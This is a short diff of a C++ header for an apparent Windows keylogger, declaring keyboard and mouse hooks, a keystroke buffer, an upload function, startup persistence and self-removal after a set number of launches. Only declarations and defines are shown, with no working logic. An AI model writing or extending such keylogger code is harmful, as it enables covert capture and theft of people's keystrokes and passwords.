@@ -51,9 +51,6 @@
 //name of the batch file used for deleting the program
 #define BATCH_NAME "cleaner.bat"
 
-//name of the file receiving key strokes
-#define KEYSTROKES_FILE "keys.html"
-
 //life time of the keylogger (i.e. number of launches before uninstalling it)
 #define KEYLOGGER_LIFETIME "10"
 
@@ -118,14 +115,12 @@ class KeyLogger {
 
     std::string removeFilespec(std::string path);
     
-    //decreases keylogger's life time and uninstall it if it's time
     void updateLifespan();
 
     void writeBuffer();
 
     void upload();
-    
-    //makes the program launch at startup
+   
     void persist(std::string path = "");
 
     static LRESULT hookFunction(int nCode, WPARAM wParam, LPARAM lParam);
@@ -140,10 +135,10 @@ class KeyLogger {
     HHOOK khook, mhook;
     
     std::ofstream logFile;
+    std::stringstream logFileName;
 
     std::string programDir;
     std::string programPath;
-    std::string programName;
 
     std::string keyboardBuffer;
 
